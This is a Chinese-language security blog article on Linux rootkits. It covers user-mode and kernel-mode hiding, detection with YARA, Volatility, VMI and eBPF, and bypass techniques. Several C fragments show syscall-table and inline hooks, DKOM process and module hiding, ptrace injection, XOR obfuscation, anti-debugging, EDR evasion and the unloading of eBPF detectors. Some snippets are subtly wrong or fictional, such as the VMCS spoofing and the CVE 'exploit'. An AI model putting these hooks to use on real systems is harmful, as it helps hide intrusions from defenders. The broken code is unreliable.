---
slug: tiangongarticle73
date: 2025-05-14
title: 隐匿与追踪：Rootkit检测与绕过技术分析
author: finley
tags: ["rootki"]
---


Rootkit是一种高隐蔽性恶意软件，广泛用于网络攻击和高级持续性威胁（APT），通过隐藏进程、文件和网络连接等实现持久化控制。随着操作系统和安全技术的发展，Rootkit的实现和检测技术持续演进。本文通过探讨Rootkit的实现原理、检测方法、绕过策略及案例分析，为安全从业者提供技术参考。

### 一、Rootkit基础概念

#### 1.1 定义

Rootkit是一种恶意软件，能够隐藏自身及相关活动（如进程、文件、网络连接），规避安全检测工具。根据运行环境，Rootkit主要分为：

* **用户态Rootkit**：运行在用户空间，通过劫持库函数或注入进程实现隐藏。
* **内核态Rootkit**：运行在内核空间，修改内核数据结构或代码，隐蔽性更高。

#### 1.2 典型功能

**隐藏进程**：修改进程链表或系统调用结果，隐藏恶意进程。

**隐藏文件**：篡改文件系统接口，隐藏恶意文件。

**隐藏网络连接**：伪造网络状态，隐藏恶意流量。

**提权后门**：提供持久化高权限访问。

**数据窃取**：窃取敏感信息，传输至C2服务器。

**自我保护**：通过反调试技术阻止分析。

### 二、Rootkit实现技术

#### 2.1 用户态Rootkit

用户态Rootkit运行在用户空间，部署简单但隐蔽性较低，适合快速攻击。

##### 2.1.1 LD_PRELOAD劫持

通过设置`LD_PRELOAD`加载自定义动态库，覆盖标准库函数。例如，劫持`readdir`隐藏特定文件：

```clike
struct dirent *readdir(DIR *dir) {
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    struct dirent *entry = real_readdir(dir);
    while (entry && strstr(entry->d_name, "malicious")) {
        entry = real_readdir(dir); // 跳过包含"malicious"的文件
    }
    return entry;
}
```

它的原理是通过设置`LD_PRELOAD`环境变量，加载一个恶意共享库，覆盖标准库函数，比如`readdir`，用于隐藏恶意文件或目录。技术上，`LD_PRELOAD`利用Linux动态链接器的优先加载机制，将恶意函数置于标准库之前。实际用途包括隐藏恶意文件的目录列表，或伪装恶意进程的活动。优势是实现简单，只需编写少量代码并设置环境变量；但局限是依赖`LD_PRELOAD`变量，容易被检测，比如通过检查环境变量或`LD_DEBUG`日志。

##### 2.1.2 进程注入

通过将恶意代码注入合法进程（如`systemd`），隐藏行为。例如，使用`ptrace`注入代码：

```clike
void inject_code(pid_t pid, unsigned char *code, size_t len) {
    void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap失败");
        return;
    }
    memcpy(mem, code, len);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace失败");
        return;
    }

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    regs.rip = (unsigned long)mem;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

unsigned char sample_code[] = {
 // 简单shellcode
};

int main() {
    pid_t target_pid = 1234; // 目标进程
    inject_code(target_pid, sample_code, sizeof(sample_code));
    return 0;
}
```

它的原理是利用`ptrace`将恶意shellcode注入合法进程的内存空间，代码运行于内存，无需磁盘文件，隐蔽性高于`LD_PRELOAD`。这里展示的代码首先通过mmap分配一块可读、可写、可执行的内存，将shellcode复制进去。然后使用ptrace的PTRACE_ATTACH附加到目标进程，获取其寄存器状态（struct user_regs_struct），修改指令指针rip指向注入的代码，最后分离进程让其执行恶意代码。

* **用途**：隐藏恶意行为，伪装为合法进程。
* **挑战**：需要root权限，`ptrace`调用可能被监控。

#### 2.2 内核态Rootkit

内核态`Rootkit`运行在Ring 0，控制系统资源，隐蔽性极高。

##### 2.2.1 系统调用表劫持

通过修改`sys_call_table`替换系统调用函数。例如，替换`sys_getdents`隐藏文件：

```clike
asmlinkage long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long ret = orig_getdents(fd, dirp, count);
    struct linux_dirent *d;
    int offset = 0;
    for (offset = 0; offset < ret; ) {
        d = (struct linux_dirent *)(dirp + offset);
        if (strstr(d->d_name, "malicious")) {
            memmove(d, d + d->d_reclen, ret - offset - d->d_reclen);
            ret -= d->d_reclen;
        } else {
            offset += d->d_reclen;
        }
    }
    return ret;
}

static int __init rootkit_init(void) {
    orig_getdents = sys_call_table[__NR_getdents];
    disable_write_protection();
    sys_call_table[__NR_getdents] = hooked_getdents;
    enable_write_protection();
    return 0;
}
```

系统调用表劫持，通过修改sys_call_table替换关键系统调用，比如sys_getdents，用于隐藏文件或进程。实现上，Rootkit需要定位sys_call_table地址（可能通过kallsyms或硬编码偏移），然后替换目标函数指针指向恶意实现。技术挑战包括绕过写保护（比如CR0的WP位）和确保hook的稳定性。

##### 2.2.2 直接内核对象操作（DKOM）

通过修改内核数据结构隐藏进程。例如，移除`task_struct`链表节点：

```clike
void hide_process(pid_t pid) {
    struct task_struct *task;
    for_each_process(task) {
        if (task->pid == pid) {
            list_del(&task->tasks); // 从进程链表移除
            task->pid = -1; // 伪装PID
            break;
        }
    }
}
```

**说明**：

* **工作原理**：从`task_struct`链表中移除目标进程，防止`ps`或`/proc`显示。
* **用途**：隐藏恶意进程，保持持久化。
* **挑战**：需要处理并发访问，防止系统崩溃。

##### 2.2.3 内核模块加载

以可加载内核模块（LKM）形式运行，注册恶意逻辑：

```clike
static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit加载\n");
    hide_process(1234); // 隐藏PID 1234
    list_del(&THIS_MODULE->list); // 隐藏模块
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit卸载\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
```

**说明**：

* **工作原理**：通过LKM加载Rootkit，隐藏自身模块，调用`hide_process`隐藏进程。
* **用途**：提供持久化恶意功能，易于部署。
* **检测**：检查`modules`链表或异常内核模块。

##### 2.2.4 内核函数内联钩子

修改内核函数指令流，插入恶意代码。例如，钩住`do_fork`：

```clike
void *orig_do_fork;
unsigned char orig_code[5];

void hooked_do_fork(void) {
    printk(KERN_INFO "拦截进程创建\n");
}

void hook_inline_do_fork(void) {
    orig_do_fork = (void *)do_fork;
    memcpy(orig_code, orig_do_fork, 5);
    unsigned char jmp_code[] = {0xE9, 0x00, 0x00, 0x00, 0x00};
    *(unsigned int *)(jmp_code + 1) = (unsigned long)hooked_do_fork - (unsigned long)orig_do_fork - 5;
    disable_write_protection();
    memcpy(orig_do_fork, jmp_code, 5);
    enable_write_protection();
}
```

**说明**：

* **工作原理**：用`JMP`指令覆盖`do_fork`前5字节，跳转到恶意代码。
* **用途**：监控或篡改进程创建。
* **优势**：比系统调用表劫持更隐蔽。

### 三、Rootkit检测技术

#### 3.1 静态检测

##### 3.1.1 签名扫描

使用YARA扫描已知Rootkit特征：

```yaml
rule Rootkit_Linux_Diamorphine {
    strings:
        $s1 = "diamorphine" ascii
        $s2 = "hide_pid" ascii
        $s3 = "invisible" ascii
    condition:
        any of them
}
```

签名扫描是最传统的方法，使用工具如YARA或ClamAV匹配已知Rootkit的特征，比如特定字符串、代码模式或文件哈希。这里展示了一个YARA规则，检测包含'diamorphine'或'hide_pid'字符串的Rootkit，这是Diamorphine Rootkit的典型特征。技术细节上，YARA通过正则表达式或字节序列扫描文件和内存，快速定位已知威胁。

实现时，规则需要定期更新以覆盖新变种，并结合多态性检测（比如模糊匹配）。优势是速度快，适合大规模扫描；局限是无法检测未知Rootkit或混淆后的变种，比如使用代码加密的Rootkit。此外，签名扫描对无文件Rootkit效果有限，因为它们不依赖磁盘文件。接下来，我们看内存镜像分析。

##### 3.1.2 内存镜像分析

使用Volatility分析内存转储，检查隐藏进程或模块：

```bash
volatility --profile=LinuxUbuntu_x64 -f mem.dump linux_pslist

volatility --profile=LinuxUbuntu_x64 -f mem.dump linux_malfind
```

**说明**：

* **工作原理**：提取内核数据结构（如`task_struct`），检测异常或隐藏对象。
* **用途**：发现DKOM隐藏的进程或无文件Rootkit。
* **工具**：Volatility、Rekall。

使用Volatility或Rekall分析系统内存转储，检查内核数据结构如task_struct，查找隐藏进程或异常行为。这里展示的Volatility命令linux_pslist，用于列出Linux系统中的进程列表，通过遍历init_task链表获取所有task_struct。

#### 3.2 动态检测

##### 3.2.1 行为监控

使用`strace`监控系统调用：

```clike
void monitor_syscalls(pid_t pid) {
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    while (1) {
        wait(NULL);
        long syscall = ptrace(PTRACE_PEEKUSER, pid, 8 * ORIG_RAX, NULL);
        printf("系统调用: %ld\n", syscall);
        ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    }
}
```

**说明**：

* **工作原理**：跟踪目标进程的系统调用，检测异常行为（如隐藏文件访问）。
* **用途**：识别Rootkit的动态行为。
* **局限**：可能被反调试技术绕过。

##### 3.2.2 交叉视图对比

比较用户态和内核态数据：

```clike
void check_hidden_processes() {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    struct task_struct *task;

    while ((entry = readdir(dir))) {
        if (entry->d_type == DT_DIR && atoi(entry->d_name) > 0) {
            printf("/proc找到进程: %s\n", entry->d_name);
        }
    }
    closedir(dir);

    for_each_process(task) {
        printf("内核找到进程: %d\n", task->pid);
    }
}
```

**说明**：

* **工作原理**：对比`/proc`和内核`task_struct`链表，检测隐藏进程。
* **用途**：发现DKOM或eBPF Rootkit隐藏的进程。
* **挑战**：需要内核权限访问`task_struct`。

交叉视图对比是动态检测的另一种常见技术，也是一种综合检测技术，通过对比多个数据源的进程、网络或文件信息，查找不一致的实体。比如，对比ps、/proc、sysfs和netstat的PID列表，如果某个PID在ps中可见但在/proc中不可见，说明可能被Rootkit隐藏。

#### 3.3 虚拟机自省检测

虚拟机自省（VMI）从Hypervisor层监控虚拟机状态，检测Rootkit。

**实现原理**：

* **内存分析**：读取虚拟机内存，检查`task_struct`是否被篡改。
* **语义重建**：将内存数据映射为进程或模块列表，检测隐藏对象。
* **隔离性**：运行在Hypervisor，Rootkit难以干扰。

**代码示例**：使用LibVMI检测隐藏进程

```clike
void check_hidden_processes(vmi_instance_t vmi) {
    vmi_pid_t pid;
    addr_t task_struct_addr, tasks_offset, pid_offset;

    vmi_translate_ksym2v(vmi, "init_task", &task_struct_addr);
    vmi_read_64_va(vmi, task_struct_addr + tasks_offset, 0, &task_struct_addr);

    while (task_struct_addr != init_task_addr) {
        vmi_read_32_va(vmi, task_struct_addr + pid_offset, 0, &pid);
        char proc_name[16];
        vmi_read_str_va(vmi, task_struct_addr + name_offset, 0, proc_name);
        printf("找到进程: PID=%d, 名称=%s\n", pid, proc_name);

        if (!is_pid_visible_in_proc(pid)) {
            printf("警告：发现隐藏进程 PID=%d\n", pid);
        }

        vmi_read_64_va(vmi, task_struct_addr + tasks_offset, 0, &task_struct_addr);
    }
}

int main() {
    vmi_instance_t vmi;
    vmi_init(&vmi, VMI_XEN, "target_vm");
    check_hidden_processes(vmi);
    vmi_destroy(vmi);
    return 0;
}
```

**说明**：

* **工作原理**：通过LibVMI访问虚拟机内存，遍历`task_struct`链表，对比`/proc`，检测隐藏进程。
* **工具**：LibVMI、DRAKVUF。
* **优势**：隔离性强，检测内核态和无文件Rootkit。
* **局限**：需虚拟化环境，配置复杂。

### 四、Rootkit绕过技术

#### 4.1 代码混淆

通过多态变形规避签名扫描：

```c
void polymorphic_obfuscate(char *code, int len) {
    unsigned char key = (unsigned char)rand();
    for (int i = 0; i < len; i++) {
        code[i] ^= key;
        key = (key + i) % 256; // 动态密钥
    }
}
```

第一种技术是代码混淆，通过加密或重组代码对抗签名扫描和模式匹配。这里展示的代码将恶意代码分成随机大小的块（4到11字节），用随机密钥进行异或加密，生成多态代码。技术细节上，polymorphic_obfuscate函数在运行时动态解密代码，执行后再擦除内存痕迹。实际场景中，Rootkit可能结合控制流混淆（插入无用跳转）或字符串加密（避免硬编码特征），进一步增加分析难度。

#### 4.2 无文件内存驻留

将代码注入合法进程内存，规避文件扫描：

```clike
#include <sys/mman.h>
#include <string.h>

void inject_code(pid_t pid, void *code, size_t len) {
    void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(mem, code, len);
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    regs.rip = (unsigned long)mem;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}
```

无文件内存驻留是Rootkit的另一种绕过技术，通过将恶意代码注入合法进程的内存运行，规避文件扫描。这里展示的代码与之前的进程注入类似，使用mmap分配可执行内存，复制shellcode，然后通过ptrace修改目标进程的rip指向注入代码。增强方法是将代码分片存储在多个进程的内存中，通过共享内存或信号动态重组，增加分析难度。

#### 4.3 反调试

检测调试器或虚拟机，终止运行：

```clike
void anti_debug(void) {
    // 检测ptrace
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        exit(1);
    }
    // 检测虚拟机
    unsigned int eax, ebx, ecx, edx;
    __cpuid(1, eax, ebx, ecx, edx);
    if (ecx & (1 << 31)) {
        exit(1);
    }
    // 检测时间延迟
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    volatile int x = 0;
    for (int i = 0; i < 1000000; i++) x++;
    clock_gettime(CLOCK_MONOTONIC, &end);
    if ((end.tv_nsec - start.tv_nsec) > 1000000) {
        exit(1);
    }
}
```

**说明**：

* **工作原理**：检查`ptrace`、Hypervisor位和执行时间，规避调试和沙箱。
* **用途**：防止行为监控和动态分析。
* **挑战**：需平衡误报率。

### 五、Rootkit绕过技术

#### 5.1 针对静态检测的绕过

##### 5.1.1 多态混淆与壳加密

**目标**：规避YARA签名扫描。

**方法**：运行时动态解密代码，结合多态变换：

```clike
#include <stdlib.h>
#include <string.h>

void polymorphic_obfuscate(unsigned char *code, int len) {
    unsigned char key = rand() % 256;
    for (int i = 0; i < len; i++) {
        code[i] ^= (key + i) % 256; // 动态异或加密
    }
}

void runtime_decrypt(unsigned char *code, int len) {
    unsigned char key = rand() % 256;
    for (int i = 0; i < len; i++) {
        code[i] ^= (key + i) % 256; // 解密
    }
    void (*func)() = (void (*)())code; // 执行解密后的代码
    func();
}
```

**针对性**：

* **对抗YARA**：每次运行生成不同代码形态，规避静态特征匹配。
* **增强**：结合UPX壳加密，动态加载解密器，仅在内存中解密。
* **检测方反制**：使用内存扫描（如Volatility的`malfind`）检测解密后的代码。
* **二次绕过**：分片存储代码，分散到多个内存区域，降低`malfind`命中率。

##### 5.1.2 伪造内存镜像

**目标**：规避Volatility的内存分析。

**方法**：伪造`task_struct`字段，模拟合法进程：

```clike
#include <linux/sched.h>

void spoof_task_struct(pid_t pid) {
    struct task_struct *task;
    for_each_process(task) {
        if (task->pid == pid) {
            strncpy(task->comm, "systemd", 16); // 伪装为合法进程名
            task->start_time = ktime_get_boot_ns() - 3600 * 1e9; // 伪造启动时间
            task->pid = 1; // 伪装为init
        }
    }
}
```

**针对性**：

* **对抗Volatility**：修改`task_struct`的`comm`、`pid`和`start_time`，规避`linux_pslist`的异常检测。
* **增强**：定期恢复`task_struct`字段，规避一致性检查。
* **检测方反制**：交叉对比`task_struct`与`/proc`，检测伪造字段。
* **二次绕过**：劫持`sys_getdents`，隐藏`/proc`中的异常条目。

#### 5.2 针对动态检测的绕过

##### 5.2.1 反调试与劫持ptrace

**目标**：规避strace和GDB调试。

**方法**：劫持`sys_ptrace`，阻止调试器附加：

```clike
#include <linux/syscalls.h>

asmlinkage long (*orig_ptrace)(long, pid_t, void *, void *);
asmlinkage long hooked_ptrace(long request, pid_t pid, void *addr, void *data) {
    if (is_protected_pid(pid)) return -EPERM; // 阻止调试Rootkit进程
    return orig_ptrace(request, pid, addr, data);
}

void hook_ptrace(void) {
    disable_write_protection();
    orig_ptrace = sys_call_table[__NR_ptrace];
    sys_call_table[__NR_ptrace] = hooked_ptrace;
    enable_write_protection();
}
```

**针对性**：

* **对抗strace**：阻止`PTRACE_ATTACH`，使调试器无法跟踪Rootkit进程。
* **增强**：伪装为内核线程（如`kthreadd`），降低怀疑。
* **检测方反制**：检查`sys_call_table`完整性。
* **二次绕过**：使用内联钩子替换表劫持，规避表检查。

##### 5.2.2 环境感知与沙箱规避

**目标**：规避EDR（如Falco）和沙箱。

**方法**：检测Falco进程并动态暂停：

```clike
#include <dirent.h>
#include <unistd.h>

void avoid_falco(void) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (strstr(entry->d_name, "falco")) {
            usleep(60000000); // 暂停60秒
            break;
        }
    }
    closedir(dir);
}
```

**针对性**：

* **对抗Falco**：暂停运行以规避实时监控，等待Falco超时。
* **增强**：检测Falco的eBPF探针（如`bpf_probe_read`调用），动态卸载。
* **检测方反制**：Falco增加探针完整性检查。
* **二次绕过**：加载伪装eBPF程序，伪造正常事件流。

#### 5.3 针对VMI的绕过

##### 5.3.1 伪造VMCS字段

**目标**：规避LibVMI和DRAKVUF的内存分析。

**方法**：干扰Hypervisor的内存映射：

```clike
#include <linux/kvm.h>

void spoof_vmcs(void) {
    struct kvm_vcpu *vcpu = current_vcpu();
    if (vcpu) {
        // 伪造EPT（扩展页表）映射
        vcpu->arch.eptp = fake_eptp_addr;
        // 修改CR3寄存器，隐藏内存区域
        vcpu->arch.cr3 = fake_cr3_addr;
    }
}
```

**针对性**：

* **对抗LibVMI**：使VMI读取到伪造的内存数据，隐藏`task_struct`。
* **增强**：动态切换EPT映射，规避一致性检查。
* **检测方反制**：VMI验证EPT完整性。
* **二次绕过**：注入伪造中断，干扰VMI的内存解析。

### 六. 高级对抗案例

#### 6.1 基于netfilter提权漏洞的eBPF Rootkit

**背景**：2024年，某Rootkit利用netfilter提权漏洞加载eBPF程序，隐藏PID 1234，绕过Falco和bpftool。

eBPF程序示例：

```c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

SEC("kprobe/sys_getdents")
int hide_process(struct pt_regs *ctx) {
    struct linux_dirent *dirp = (struct linux_dirent *)PT_REGS_PARM2(ctx);
    long ret = PT_REGS_RC(ctx);
    for (int offset = 0; offset < ret; ) {
        struct linux_dirent *d = dirp + offset;
        char buf[256];
        bpf_probe_read_str(buf, sizeof(buf), d->d_name);
        if (bpf_strncmp(buf, sizeof(buf), "1234") == 0) {
            bpf_probe_write(dirp + offset, ret - offset - d->d_reclen, dirp + offset + d->d_reclen);
            ret -= d->d_reclen;
            PT_REGS_RC(ctx) = ret;
        } else {
            offset += d->d_reclen;
        }
    }
    return 0;
}
```

这里展示的eBPF程序附加kprobe到sys_getdents，读取目录项名称（d_name），如果包含目标PID（如'1234'），就通过bpf_probe_write移除该项，隐藏进程。技术细节上，bpf_probe_read_str安全地读取用户态数据到内核缓冲区，bpf_strncmp比较字符串，bpf_probe_write修改目录项列表。

eBPF程序通过BPF_PROG_TYPE_KPROBE加载，运行在内核态，效率高且难以检测。

#### 6.2 eBPF检测Rootkit的典型方法

##### 6.2.1 系统调用监控

```c
SEC("tracepoint/syscalls/sys_enter_ptrace")
int trace_ptrace(struct trace_event_raw_sys_enter *ctx) {
    // 1. 获取当前进程信息
    bpf_get_current_comm(&comm, sizeof(comm));

    long request = ctx->args[0]; //PTRACE_ATTACH(16) 和 PTRACE_PEEKTEXT(1)
    if (request != 16 && request != 1) return 0;

    // 3. 白名单放行（如 strace、gdb）
    if (comm[0] == 's' && comm[1] == 't' && comm[2] == 'r') return 0; // strace
    if (comm[0] == 'g' && comm[1] == 'd' && comm[2] == 'b') return 0; // gdb

    // 4. 打印警告（PID、进程名、操作类型）
    bpf_printk("Suspicious ptrace: %s (pid=%d) request=%d", comm, pid, request);
    return 0;
}
```

eBPF不仅可用于攻击，也可用于检测Rootkit。技术细节上，tracepoint/syscalls/sys_enter_ptrace提供稳定的hook点，bpf_printk将警告输出到/var/log/kern.log或trace_pipe。实际场景中，Falco等工具使用类似机制，结合eBPF和规则引擎，检测异常的ptrace调用或进程注入行为。优势是实时性强，能捕获Rootkit的动态行为；局限是需要精确的白名单，避免误报，且Rootkit可能通过直接syscall绕过tracepoint。增强方法包括监控其他系统调用（如sys_mmap或sys_open）或结合用户态uprobe。

##### 6.2.2 隐藏内核模块检测

```clike
SEC("kretprobe/do_init_module")
int check_module_after_load(struct pt_regs *ctx) {
    // 此时模块应该已经加入 `/proc/modules`
    char mod_name[MODULE_NAME_LEN];
    struct module *mod = (struct module *)PT_REGS_RC(ctx); // 返回值是 struct module *

    if (bpf_kallsyms_lookup_name(mod->name) == 0) {
        bpf_printk("Hidden module detected: %s", mod->name);
    }
    return 0;
}
```

另一种eBPF检测方法是检查隐藏的内核模块。这里展示的程序附加kretprobe到do_init_module，捕获模块加载完成后的返回值（struct module \*）。代码检查模块名称是否出现在kallsyms符号表，如果bpf_kallsyms_lookup_name返回0，说明模块被隐藏（比如通过list_del移除）。技术细节上，kretprobe通过PT_REGS_RC获取do_init_module的返回值，bpf_printk记录可疑模块的名称。实际场景中，检测工具可能结合lsmod和/proc/modules的交叉对比，进一步验证隐藏模块。

#### 6.3 Rootkit绕过 eBPF检测的核心技术

##### 6.3.1. 破坏 eBPF 程序的执行（运行时绕过）

###### 卸载或篡改 eBPF 检测程序

**目标**：让 eBPF 检测程序失效（需避免触发异常）。

* **直接卸载 eBPF 程序**（需 root 权限）：

```c
// 通过 sys_bpf(BPF_PROG_DETACH) 卸载目标 eBPF 程序
syscall(__NR_bpf, BPF_PROG_DETACH, &attr, sizeof(attr));
```

* **篡改 eBPF Map**（使检测逻辑失效）：

```c
// 找到 eBPF 检测程序的 map，并清空或篡改数据
int map_fd = bpf_obj_get("/sys/fs/bpf/detection_map");
__u32 key = 0;
__u64 value = 0;
bpf_map_update_elem(map_fd, &key, &value, BPF_ANY); // 覆盖检测数据
```

##### 6.3.2. 绕过 eBPF 的监控范围（规避检测）

###### 使用 eBPF 未监控的调用路径

eBPF 通常挂载在 `tracepoint` / `kprobe` / `LSM` /`uprobe` 等 hook 点，但以下路径可能未被覆盖：

* **直接调用** `syscall` 而非 glibc 包装（绕过用户层监控）：

```none
mov rax, 0   ; __NR_read
mov rdi, fd  ; file descriptor
mov rsi, buf ; buffer
mov rdx, len ; length
syscall      ; 直接系统调用，可能绕过部分 eBPF 监控
```

* **使用** `io_uring` 替代常规文件操作（部分 eBPF 检测未覆盖）：

```clike
io_uring_prep_read(sqe, fd, buf, len, offset); // 绕过 read() 监控
```

##### 6.3.3. 对抗 eBPF 验证器（加载时绕过）

###### 利用验证器漏洞加载恶意 eBPF

**目标**：绕过 eBPF 验证器的安全检查，加载恶意程序。

**方法**：

* **CVE-2021-31440**（Linux 内核 eBPF 验证器漏洞）：

```clike
// 构造特殊 eBPF 指令，绕过边界检查
struct bpf_insn prog[] = {
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_0, 0), // 触发验证器绕过
    BPF_EXIT_INSN(),
};
bpf_load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog));
```

### 七、总结

Rootkit攻防是一场隐蔽与检测的持续博弈。早期通过系统调用劫持实现，防御方用签名校验反制；中期转向DKOM和无文件技术，也催生了eBPF动态分析和内存镜像分析；现代Rootkit深入硬件层，比如UEFI固件攻击或Cache侧信道攻击，防御则依托可信执行环境（如SGX）和AI驱动的行为分析。各种新技术的兴起为攻防双方提供了新工具，但也带来了新的复杂性。